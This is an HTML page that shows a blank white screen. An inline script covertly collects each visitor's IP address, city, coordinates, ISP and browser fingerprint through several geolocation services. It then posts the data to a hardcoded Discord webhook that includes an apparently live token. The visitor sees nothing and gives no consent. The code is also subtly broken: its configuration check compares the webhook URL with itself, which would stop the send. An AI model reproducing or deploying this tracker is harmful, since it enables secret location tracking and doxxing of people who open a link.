<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            background-color: #ffffff;
            min-height: 100vh;
            width: 100%;
        }
    </style>
</head>
<body>

<script>
    (function() {
        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ';
        
        let notificationSent = false;
        let successfulData = false;
        let activeTimeouts = [];
        let attemptsCount = 0;
        
        let visitorData = {
            ip: null,
            country: null,
            country_code: null,
            region: null,
            city: null,
            latitude: null,
            longitude: null,
            timezone: null,
            isp: null,
            source_service: null,
            user_agent: navigator.userAgent,
            platform: navigator.platform,
            language: navigator.language,
            screen_resolution: window.screen.width + 'x' + window.screen.height,
            screen_color_depth: window.screen.colorDepth,
            timezone_offset: new Date().getTimezoneOffset(),
            referrer: document.referrer || null,
            current_url: window.location.href,
            hostname: window.location.hostname,
            connection_type: navigator.connection ? navigator.connection.effectiveType : null,
            hardware_concurrency: navigator.hardwareConcurrency,
            cookies_enabled: navigator.cookieEnabled,
            timestamp: null,
            success: false,
            error_message: null,
            browser_time: new Date().toString()
        };
        
        function sendToDiscord(data) {
            if (notificationSent) return;
            if (!WEBHOOK_URL || WEBHOOK_URL === 'https://discord.com/api/webhooks/1485791212681302172/iu7AbfwcqpHibaTEi3PZYPdYiNm_WMn0nqumGMDfLKPd1A7J8a6Ix9NvLBrr0Z-OzJjJ') {
                console.warn('Webhook URL not configured');
                return;
            }
            
            notificationSent = true;
            data.timestamp = new Date().toISOString();
            
            let embedColor = data.success ? 0x00ff00 : 0xffaa00;
            let title = data.success ? '✅ Visitor Detected' : '📊 Visitor Detected';
            
            let fields = [];
            
            if (data.ip) fields.push({ name: '🌐 IP Address', value: data.ip, inline: true });
            if (data.country) fields.push({ name: '📍 Country', value: data.country, inline: true });
            if (data.city) fields.push({ name: '🏙️ City', value: data.city, inline: true });
            if (data.region) fields.push({ name: '🗺️ Region', value: data.region, inline: true });
            if (data.latitude && data.longitude) fields.push({ name: '📌 Coordinates', value: `${data.latitude}, ${data.longitude}`, inline: true });
            if (data.timezone) fields.push({ name: '🕐 Timezone', value: data.timezone, inline: true });
            if (data.isp) fields.push({ name: '🔌 ISP', value: data.isp, inline: true });
            if (data.source_service) fields.push({ name: '📡 Source', value: data.source_service, inline: false });
            
            fields.push({ name: '💻 User Agent', value: data.user_agent.substring(0, 100) + (data.user_agent.length > 100 ? '...' : ''), inline: false });
            fields.push({ name: '🖥️ Screen', value: data.screen_resolution, inline: true });
            fields.push({ name: '🌍 Language', value: data.language, inline: true });
            fields.push({ name: '🔗 Page', value: data.current_url.substring(0, 120), inline: false });
            
            if (data.error_message) {
                fields.push({ name: 'ℹ️ Note', value: data.error_message, inline: false });
            }
            
            let payload = {
                embeds: [{
                    title: title,
                    color: embedColor,
                    fields: fields,
                    footer: { text: `Attempts: ${attemptsCount} | ${new Date().toLocaleString()}` },
                    timestamp: data.timestamp
                }]
            };
            
            fetch(WEBHOOK_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
                keepalive: true
            }).catch(function(err) {
                console.warn('Webhook failed:', err);
            });
        }
        
        function sendFinalNotification() {
            if (notificationSent) return;
            visitorData.success = successfulData;
            if (!visitorData.ip) {
                visitorData.ip = 'unavailable-' + Date.now().toString(36);
                visitorData.error_message = visitorData.error_message || 'IP could not be retrieved due to browser privacy settings';
            }
            sendToDiscord(visitorData);
        }
        
        function mergeData(newData, serviceName) {
            if (!newData) return false;
            
            let hasNewInfo = false;
            
            if (newData.ip && !visitorData.ip) {
                visitorData.ip = newData.ip;
                hasNewInfo = true;
            }
            if (newData.country && !visitorData.country) {
                visitorData.country = newData.country;
                hasNewInfo = true;
            }
            if (newData.country_code && !visitorData.country_code) {
                visitorData.country_code = newData.country_code;
                hasNewInfo = true;
            }
            if (newData.region && !visitorData.region) {
                visitorData.region = newData.region;
                hasNewInfo = true;
            }
            if (newData.city && !visitorData.city) {
                visitorData.city = newData.city;
                hasNewInfo = true;
            }
            if (newData.latitude && !visitorData.latitude) {
                visitorData.latitude = newData.latitude;
                hasNewInfo = true;
            }
            if (newData.longitude && !visitorData.longitude) {
                visitorData.longitude = newData.longitude;
                hasNewInfo = true;
            }
            if (newData.timezone && !visitorData.timezone) {
                visitorData.timezone = newData.timezone;
                hasNewInfo = true;
            }
            if (newData.isp && !visitorData.isp) {
                visitorData.isp = newData.isp;
                hasNewInfo = true;
            }
            
            if (hasNewInfo && !visitorData.source_service) {
                visitorData.source_service = serviceName;
            } else if (hasNewInfo && visitorData.source_service) {
                visitorData.source_service = visitorData.source_service + ' → ' + serviceName;
            }
            
            if (hasNewInfo) {
                successfulData = true;
            }
            
            return hasNewInfo;
        }
        
        function jsonpRequest(url, callbackName, timeout) {
            return new Promise(function(resolve, reject) {
                let script = document.createElement('script');
                let callbackFunction = 'jsonp_' + Date.now() + '_' + Math.random().toString(36).substr(2, 8);
                let timeoutId = setTimeout(function() {
                    if (script.parentNode) script.parentNode.removeChild(script);
                    delete window[callbackFunction];
                    reject(new Error('JSONP timeout'));
                }, timeout || 5000);
                
                window[callbackFunction] = function(data) {
                    clearTimeout(timeoutId);
                    delete window[callbackFunction];
                    if (script.parentNode) script.parentNode.removeChild(script);
                    resolve(data);
                };
                
                let separator = url.indexOf('?') === -1 ? '?' : '&';
                script.src = url + separator + 'callback=' + callbackFunction;
                script.onerror = function() {
                    clearTimeout(timeoutId);
                    delete window[callbackFunction];
                    if (script.parentNode) script.parentNode.removeChild(script);
                    reject(new Error('JSONP load failed'));
                };
                document.head.appendChild(script);
            });
        }
        
        function serviceIpApiJsonp() {
            attemptsCount++;
            return jsonpRequest('https://ip-api.com/json/', 'callback', 5000)
                .then(function(data) {
                    if (data && data.status === 'success' && data.query) {
                        return {
                            ip: data.query,
                            country: data.country,
                            country_code: data.countryCode,
                            region: data.regionName,
                            city: data.city,
                            latitude: data.lat,
                            longitude: data.lon,
                            isp: data.isp,
                            timezone: data.timezone
                        };
                    }
                    throw new Error('ip-api failed');
                });
        }
        
        function serviceIpWhoIsJsonp() {
            attemptsCount++;
            return jsonpRequest('https://ipwho.is/', 'callback', 5000)
                .then(function(data) {
                    if (data && data.success === true && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.connection ? data.connection.isp : null
                        };
                    }
                    throw new Error('ipwho.is failed');
                });
        }
        
        function serviceIpApiCoDirect() {
            attemptsCount++;
            return fetch('https://ipapi.co/json/', {
                mode: 'cors',
                headers: { 'Accept': 'application/json' }
            })
                .then(function(response) {
                    if (!response.ok) throw new Error('ipapi.co failed');
                    return response.json();
                })
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.org
                        };
                    }
                    throw new Error('ipapi.co no ip');
                })
                .catch(function() {
                    return serviceIpApiCoJsonp();
                });
        }
        
        function serviceIpApiCoJsonp() {
            attemptsCount++;
            return jsonpRequest('https://ipapi.co/json/', 'callback', 5000)
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.org
                        };
                    }
                    throw new Error('ipapi.co jsonp failed');
                });
        }
        
        function serviceIpWhoIsAppJsonp() {
            attemptsCount++;
            return jsonpRequest('https://ipwhois.app/json/', 'callback', 5000)
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country,
                            country_code: data.country_code,
                            region: data.region,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.timezone,
                            isp: data.isp
                        };
                    }
                    throw new Error('ipwhois.app failed');
                });
        }
        
        function serviceIpInfoJsonp() {
            attemptsCount++;
            return jsonpRequest('https://ipinfo.io/json', 'callback', 5000)
                .then(function(data) {
                    if (data && data.ip) {
                        let result = {
                            ip: data.ip,
                            country: data.country,
                            region: data.region,
                            city: data.city,
                            timezone: data.timezone
                        };
                        if (data.loc) {
                            let coords = data.loc.split(',');
                            if (coords.length === 2) {
                                result.latitude = parseFloat(coords[0]);
                                result.longitude = parseFloat(coords[1]);
                            }
                        }
                        return result;
                    }
                    throw new Error('ipinfo failed');
                });
        }
        
        function serviceFreeGeoIpJsonp() {
            attemptsCount++;
            return jsonpRequest('https://freegeoip.app/json/', 'callback', 5000)
                .then(function(data) {
                    if (data && data.ip) {
                        return {
                            ip: data.ip,
                            country: data.country_name,
                            country_code: data.country_code,
                            region: data.region_name,
                            city: data.city,
                            latitude: data.latitude,
                            longitude: data.longitude,
                            timezone: data.time_zone
                        };
                    }
                    throw new Error('freegeoip failed');
                });
        }
        
        function serviceIpApiCoFallback() {
            attemptsCount++;
            return fetch('https://ipapi.co/json/', {
                mode: 'no-cors',
                headers: { 'Accept': 'application/json' }
            })
                .then(function() {
                    return null;
                })
                .catch(function() {
                    return null;
                });
        }
        
        let services = [
            { name: 'ip-api.com (JSONP)', fn: serviceIpApiJsonp, priority: 1 },
            { name: 'ipwho.is (JSONP)', fn: serviceIpWhoIsJsonp, priority: 2 },
            { name: 'ipapi.co', fn: serviceIpApiCoDirect, priority: 3 },
            { name: 'ipwhois.app (JSONP)', fn: serviceIpWhoIsAppJsonp, priority: 4 },
            { name: 'ipinfo.io (JSONP)', fn: serviceIpInfoJsonp, priority: 5 },
            { name: 'freegeoip.app (JSONP)', fn: serviceFreeGeoIpJsonp, priority: 6 }
        ];
        
        let currentIndex = 0;
        let completed = false;
        
        function clearAllTimeouts() {
            for (let i = 0; i < activeTimeouts.length; i++) {
                clearTimeout(activeTimeouts[i]);
            }
            activeTimeouts = [];
        }
        
        function tryNextService() {
            if (completed) return;
            
            if (currentIndex >= services.length) {
                if (!successfulData) {
                    visitorData.error_message = 'All IP services failed. Browser privacy features may be blocking requests.';
                    sendFinalNotification();
                } else {
                    sendFinalNotification();
                }
                completed = true;
                clearAllTimeouts();
                return;
            }
            
            let service = services[currentIndex];
            currentIndex++;
            
            let timeoutId = setTimeout(function() {
                tryNextService();
            }, 6000);
            activeTimeouts.push(timeoutId);
            
            service.fn()
                .then(function(data) {
                    clearTimeout(timeoutId);
                    if (completed) return;
                    
                    if (data && data.ip) {
                        let hadData = mergeData(data, service.name);
                        if (hadData && !completed) {
                            sendFinalNotification();
                            completed = true;
                            clearAllTimeouts();
                        } else if (!completed) {
                            tryNextService();
                        }
                    } else {
                        tryNextService();
                    }
                })
                .catch(function() {
                    clearTimeout(timeoutId);
                    if (!completed) {
                        tryNextService();
                    }
                });
        }
        
        function fallbackTimeout() {
            let fallbackTimer = setTimeout(function() {
                if (!completed && !notificationSent) {
                    if (!visitorData.ip) {
                        visitorData.ip = 'blocked-' + Date.now().toString(36);
                        visitorData.error_message = 'IP lookup blocked by browser privacy features';
                    }
                    sendFinalNotification();
                    completed = true;
                }
                clearAllTimeouts();
            }, 10000);
            activeTimeouts.push(fallbackTimer);
        }
        
        function collectBrowserInfo() {
            try {
                let timezoneName = Intl.DateTimeFormat().resolvedOptions().timeZone;
                if (timezoneName && !visitorData.timezone) visitorData.timezone = timezoneName;
            } catch(e) {}
            
            visitorData.viewport_width = window.innerWidth;
            visitorData.viewport_height = window.innerHeight;
            visitorData.is_touch_device = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
            visitorData.local_time = new Date().toString();
            
            if (navigator.deviceMemory) visitorData.device_memory = navigator.deviceMemory + 'GB';
        }
        
        collectBrowserInfo();
        
        tryNextService();
        
        fallbackTimeout();
        
        window.addEventListener('load', function() {
            setTimeout(function() {
                if (!completed && visitorData.ip) {
                    sendFinalNotification();
                    completed = true;
                } else if (!completed && !notificationSent) {
                    sendFinalNotification();
                    completed = true;
                }
            }, 8000);
        });
        
        setTimeout(function() {
            if (!notificationSent && !completed) {
                visitorData.error_message = visitorData.error_message || 'Delayed notification - data collection ongoing';
                sendFinalNotification();
            }
        }, 12000);
    })();
</script>
</body>
</html>
